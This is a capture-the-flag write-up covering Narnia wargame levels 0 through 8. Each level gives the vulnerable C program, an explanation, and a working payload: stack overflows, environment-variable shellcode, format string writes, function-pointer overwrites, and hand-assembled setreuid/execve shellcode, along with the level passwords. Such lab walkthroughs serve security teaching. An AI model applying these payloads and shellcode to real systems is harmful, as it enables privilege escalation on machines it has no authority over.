## narnia0 -> narnia1
```C
#include <stdio.h>
#include <stdlib.h>

int main(){
	long val=0x41414141;
	char buf[20];

	printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
	printf("Here is your chance: ");
	scanf("%24s",&buf);

	printf("buf: %s\n",buf);
	printf("val: 0x%08x\n",val);

	if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
		system("/bin/sh");
    }
	else {
		printf("WAY OFF!!!!\n");
		exit(1);
	}

	return 0;
}

```

```bash
 $ (python -c 'print "a"*19+"\x00"+"\xef\xbe\xad\xde"';cat) | ./narnia0
```

##### PASS=efeidiedae 


------------------------------------------------------------------------------------------------------------------------------------


## narnia1 -> narnia2

```C
#include <stdio.h>

int main(){
	int (*ret)();

	if(getenv("EGG")==NULL){
		printf("Give me something to execute at the env-variable EGG\n");
		exit(1);
	}

	printf("Trying to execute EGG!\n");
	ret = getenv("EGG");
	ret();

	return 0;
}
```


To solve this exercise you need to put the shellcode in the env var EGG.


```bash
$ export EGG=$(python -c 'print "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"')
```


##### PASS=nairiepecu





------------------------------------------------------------------------------------------------------------------------------------

## narnia2 -> narnia3

```C
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
	char buf[128];

	if(argc == 1){
		printf("Usage: %s argument\n", argv[0]);
		exit(1);
	}
	strcpy(buf,argv[1]);
	printf("%s", buf);

	return 0;
}
```

Here we have a classic BO (remember we have no ASLR and NX bit disabled). I approached this challenge by doing a ret2libc attack, but the shell spawned by this attack simply does not have narnia3 suid permission so we have to call setreuid with id of narnia3 user found in /etc/passwd.

narnia3 user id is 14003, so i could do a ret2libc composed by a call to setreuid and then a system bash. Alternatively is possible to perform a ropchain. 
I decided to exploit this challenge by making my own shellcode.

```assembly
xor    %ebx,%ebx  # \x31\xdb  
lea    0x17(%ebx),%eax # \x8d\x43\x17           
int    $0x80 # \xcd\x80 
push   %ebx # \x53                           
push   $0x68732f6e # \x68\x6e\x2f\x73\x68       
push   $0x69622f2f # \x68\x2f\x2f\x62\x69      
mov %esp,%ebx # \x89\xe3               
push %eax # \x50                              
push %ebx # \x53                              
mov %esp,%ecx # \x89\xe1                
cltd # \x99                                     
mov $0xb,%al # \xb0\x0b                       
int $0x80 # \xcd\x80  
```



This shellcode makes a setreuid(0) syscall and then executes execve(/bin/bash), so I added the shellcode instruction that moves 0x36b3 (14003) in %ebx before making the syscall setreuid. 

Here is the final shellcode. 
```assembly
xor %ebx,%ebx # \x31\xdb
mov $0x36b3,%ebx # \xbb\xb3\x36\x00\x00
lea 0x17(%ebx),%eax # \x8d\x43\x17
int $0x80 # \xcd\x80
push %ebx # \x53 
push $0x68732f6e # \x68\x6e\x2f\x73\x68
push $0x69622f2f # \x68\x2f\x2f\x62\x69
mov %esp,%ebx # \x89\xe3
push %eax # \x50                            
push %ebx # \x53
mov %esp,%ecx # \x89\xe1                    
cltd #\x99               
mov $0xb,%al # \xb0\x0b
int $0x80 # \xcd\x80
```
##### PASS=vaequeezee

------------------------------------------------------------------------------------------------------------------------------------

## narnia3 -> narnia4
```C
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){

        int  ifd,  ofd;
        char ofile[16] = "/dev/null";
        char ifile[32];
        char buf[32];

        if(argc != 2){
                printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
                exit(-1);
        }

        /* open files */
        strcpy(ifile, argv[1]);
        if((ofd = open(ofile,O_RDWR)) < 0 ){
                printf("error opening %s\n", ofile);
                exit(-1);
        }
        if((ifd = open(ifile, O_RDONLY)) < 0 ){
                printf("error opening %s\n", ifile);
                exit(-1);
        }

        /* copy from file1 to file2 */
        read(ifd, buf, sizeof(buf)-1);
        write(ofd,buf, sizeof(buf)-1);
        printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);

        /* close 'em */
        close(ifd);
        close(ofd);

        exit(1);
}
```

This program just copies the content of argv[1] into the ifile variable without checking the boundaries, and copies the content of the file passed as argument in `/dev/null`. The exploit consist into create a symbolic link, which has as a name the string "aaaa...*48 times", to a flag, then passing the symbolic link as argv[1] so that when the function open is performed the value of ifile is aaaa...*48 times.

Now we can overflow ifile by inserting 16 more characters as argument in order to overwrite the value of ofile. 
After that, ifile value is aaaa...*48 times and ofile contains aaaa...*16 times.

Now we make `/tmp/exploit` folder in which we create the symbolic link to the flag file and an empty file, export `PATH` env variable with the `/narnia` directory and launch the suid program passing the argument suggested above.





##### PASS=thaenohtai




------------------------------------------------------------------------------------------------------------------------------------

## narnia4 -> narnia5

```C
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

extern char **environ;

int main(int argc,char **argv){
	int i;
	char buffer[256];

	for(i = 0; environ[i] != NULL; i++)
		memset(environ[i], '\0', strlen(environ[i]));

	if(argc>1)
		strcpy(buffer,argv[1]);

	return 0;
}
```

In this exploit we have no `ASLR` and `NX` disable so I decided to create my own shellcode.
This shellcode perform 2 syscall:
* `setreuid` -> set real and effective uid to suid user(Narnia5 -> check in passwd -> 14005)
* `execve /bin/sh`



In order to have the string `/bin/sh` in process's address layout I opted to load in argv[2] the string `/bin/sh` several times (7).
I filled buffer variable with a series of NOP instructions and the shellcode at the end, then I added some junk bytes in order to fill the void between my bytes and RA.

After this I overwritten the RA with a generic address in order to jump among the NOPs.

To make the shellcode works it is necessary that spacing characters are not included in the shellcode.


This is my PIC:


```assembly
08048054 <_start>:
 8048054:	31 db                	xor    %ebx,%ebx
 8048056:	31 c9                	xor    %ecx,%ecx
 8048058:	31 c0                	xor    %eax,%eax
 804805a:	31 ff                	xor    %edi,%edi
 804805c:	66 bb b5 36          	mov    $0x36b5,%bx
 8048060:	66 b9 b5 36          	mov    $0x36b5,%cx
 8048064:	b0 46                	mov    $0x46,%al
 8048066:	cd 80                	int    $0x80
 8048068:	31 d2                	xor    %edx,%edx
 804806a:	31 db                	xor    %ebx,%ebx
 804806c:	31 c9                	xor    %ecx,%ecx
 804806e:	31 c0                	xor    %eax,%eax
 8048070:	b0 3b                	mov    $0x0b,%al
 8048072:	bb cc ff ff ff       	mov    $0xffffffcc,%ebx   # I change this value with address "/bin/sh" passed as argument, note that I pass several arguments with that string
 8048077:	cd 80                	int    $0x80
 
 ```


```bash
$ ./narnia4 $(python -c 'print "\x90"*217+"\x31\xdb\x31\xc9\x31\xc0\x31\xff\x66\xbb\xb5\x36\x66\xb9\xb5\x36\xb0\x46\xcd\x80\x31\xc9\x31\xd2\x31\xff\x31\xc0\xb0\x0b\xbb\xe7\xd7\xff\xff\xcd\x80"+"b"*18+"\x70\xd7\xff\xff"+" "+"/////bin/sh "*7')
```



##### PASS=faimahchiy


------------------------------------------------------------------------------------------------------------------------------------


## narnia5 -> narnia6

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){
	int i = 1;
	char buffer[64];

	snprintf(buffer, sizeof buffer, argv[1]);
	buffer[sizeof (buffer) - 1] = 0;
	printf("Change i's value from 1 -> 500. ");

	if(i==500){
		printf("GOOD\n");
        setreuid(geteuid(),geteuid());
		system("/bin/sh");
	}

	printf("No way...let me give you a hint!\n");
	printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
	printf ("i = %d (%p)\n", i, &i);
	return 0;
}
```
The snprintf in this exercise suffers of format string vulnerability, so to complete this level I use that attack to set the correct value to i variable.
The program displays i variable address and it never changes because there is no ASLR.
So I decided to perform format string attack with direct parameter access.

Notice that we can write format string in argv[1] and with sprints we are able to write everywhere in memory.

```bash
./narnia5 $(python -c 'print "\x0c\xd4\xff\xff"*125+"%15$n"')
```


##### pass=neezocaeng



------------------------------------------------------------------------------------------------------------------------------------

## narnia6 -> narnia7
```C

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

extern char **environ;

// tired of fixing values...
// - morla
unsigned long get_sp(void) {
       __asm__("movl %esp,%eax\n\t"
               "and $0xff000000, %eax"
               );
}

int main(int argc, char *argv[]){
	char b1[8], b2[8];
	int  (*fp)(char *)=(int(*)(char *))&puts, i;

	if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }

	/* clear environ */
	for(i=0; environ[i] != NULL; i++)
		memset(environ[i], '\0', strlen(environ[i]));
	/* clear argz    */
	for(i=3; argv[i] != NULL; i++)
		memset(argv[i], '\0', strlen(argv[i]));

	strcpy(b1,argv[1]);
	strcpy(b2,argv[2]);
	//if(((unsigned long)fp & 0xff000000) == 0xff000000)
	if(((unsigned long)fp & 0xff000000) == get_sp())
		exit(-1);
	setreuid(geteuid(),geteuid());
    fp(b1);

	exit(1);
}
```
The vulnerability is obviously in `strcpy` function that allows us to copy from argv to b1 and b2 arrays.

So after few attempts I realized that I can, for some reason, overwrite the fp function pointer.
In gdb I realized that the b2 array, which correspond to argv[2], can overwrites in some way fp pointer.

Let's explore what happens in gdb:

0xffffd5e8:	0x62626262	0x62626262
0xffffd5f0:	0x61610062	0x61616161	0x08040061 -> it's fp pointer overflowed by one 'a'


We can overwrite fp pointer with the address of system function, but what about `/bin/sh` string?
 
We have to put it somewhere in the stack - or we can find it typically in libc(but the address includes some \x00 byte and we cannot pass that as arguments directly).
So I revert the attack and I decided that, for simplicity, b2 will overwrite the stack frames with what I need to hijack the execution.
So after some try I overwrite fp with address of `system` and as arguments I place `/bin/sh;`.
Note that `;`, that's because I cannot put string terminator `\x00` at the end of the string because it will be ignored.
So recall to the fact that ; enables command concatenation I call system for two command: `/bin/sh` as first command and "SOMESHITTYHEX" as second command.
That's work!

```bash
$ ./narnia6 $(python -c 'print "a"*4+" "+"/bin/sh;"*2+"\x40\x19\xe5\xf7"')
```


##### PASS=ahkiaziphu


------------------------------------------------------------------------------------------------------------------------------------


## narnia7 -> narnia8

```C

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

int goodfunction();
int hackedfunction();

int vuln(const char *format){
        char buffer[128];
        int (*ptrf)();

        memset(buffer, 0, sizeof(buffer));
        printf("goodfunction() = %p\n", goodfunction);
        printf("hackedfunction() = %p\n\n", hackedfunction);

        ptrf = goodfunction;
        printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);

        printf("I guess you want to come to the hackedfunction...\n");
        sleep(2);
        ptrf = goodfunction;

        snprintf(buffer, sizeof buffer, format);

        return ptrf();
}

int main(int argc, char **argv){
        if (argc <= 1){
                fprintf(stderr, "Usage: %s <buffer>\n", argv[0]);
                exit(-1);
        }
        exit(vuln(argv[1]));
}

int goodfunction(){
        printf("Welcome to the goodfunction, but i said the Hackedfunction..\n");
        fflush(stdout);

        return 0;
}

int hackedfunction(){
        printf("Way to go!!!!");
	    fflush(stdout);
        setreuid(geteuid(),geteuid());
        system("/bin/sh");

        return 0;
}

``` 
This level consists in a format string attack. 

I used DPA to perform a format string attack then, with a copy of SUID program in `/tmp/cc`, I generated a core dump file in order to set the string passed as argument.

```bash
$ ./narnia7 $(python -c 'print "\x7c\xd4\xff\xff"*18+"\x7d\xd4\xff\xff"+"\x7e\xd4\xff\xff"+"\x7f\xd4\xff\xff"+"aa%23$n"+"aaaa"*12+"a"+"%24$n"+"bbbb"*31+"b"+"%25$n"+"aaaa"+"%26$n"')
```

##### PASS=mohthuphog



------------------------------------------------------------------------------------------------------------------------------------




## narnia8 -> narnia9

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
// gcc's variable reordering fucked things up
// to keep the level in its old style i am
// making "i" global unti i find a fix
// -morla
int i;

void func(char *b){
	char *blah=b;
	char bok[20];
	//int i=0;

	memset(bok, '\0', sizeof(bok));
	for(i=0; blah[i] != '\0'; i++)
		bok[i]=blah[i];

	printf("%s\n",bok);
}

int main(int argc, char **argv){

	if(argc > 1)
		func(argv[1]);
	else
	printf("%s argument\n", argv[0]);

	return 0;
}
```
This last exploit consists in a buffer overflow.
The for iteration in func is a byte to byte assignment that stops if our argv[1] contains null byte for any i>0.

Now we can write in bok buffer, but overflowing it will overwrite blah pointer.
This overwrite has a side effect, in fact if we are not careful enough, the `base pointer` of blah will be `SOMESHITTYHEX`.

After filling bok buffer, we have to put argv[1] address in order to not change the byte to byte copy, letting the cycle continue.
After that we have  ebp and RA that's our goal!

The shellcode is placed above the RA in the stack region since the NX bit is disabled.
I placed `/bin/sh` string as well after the shellcode.

In order to make some attempts I executed a copy of the suid program in `/tmp/rr` with the aim to leak some addresses.

After some attempts the attack worked!

Here is the shellcode:
```assembly
08048054 <_start>:
 8048054:	31 db                	xor    %ebx,%ebx
 8048056:	31 c9                	xor    %ecx,%ecx
 8048058:	31 c0                	xor    %eax,%eax
 804805a:	31 ff                	xor    %edi,%edi
 804805c:	66 bb b5 36          	mov    $0x36b9,%bx
 8048060:	66 b9 b5 36          	mov    $0x36b9,%cx
 8048064:	b0 46                	mov    $0x46,%al
 8048066:	cd 80                	int    $0x80
 8048068:	31 d2                	xor    %edx,%edx
 804806a:	31 db                	xor    %ebx,%ebx
 804806c:	31 c9                	xor    %ecx,%ecx
 804806e:	31 c0                	xor    %eax,%eax
 8048070:	b0 0b                	mov    $0x0b,%al
 8048072:	bb cc ff ff ff       	mov    $0xffffffcc,%ebx   # I change this value with the address of "/bin/sh" passed as argument - you can see it in the core dump generated by the copy of suid program
 8048077:	cd 80                	int    $0x80
```
```bash
$ ./narnia8 $(python -c 'print "a"*20+"\x85\xd7\xff\xff"+"\xb5\xd7\xff\xff"*4+"\xb5\xd7\xff\xff"+"\x90"*20+"\x31\xdb\x31\xc9\x31\xc0\x31\xff\x66\xbb\xb9\x36\x66\xb9\xb9\x36\xb0\x46\xcd\x80\x31\xc9\x31\xd2\x31\xff\x31\xc0\xb0\x0b\xbb\x12\xd8\xff\xff\xcd\x80"+"b"*18+"\x70\xd7\xff\xff"+"//////////////////////bin/sh"')
```
##### PASS=eiL5fealae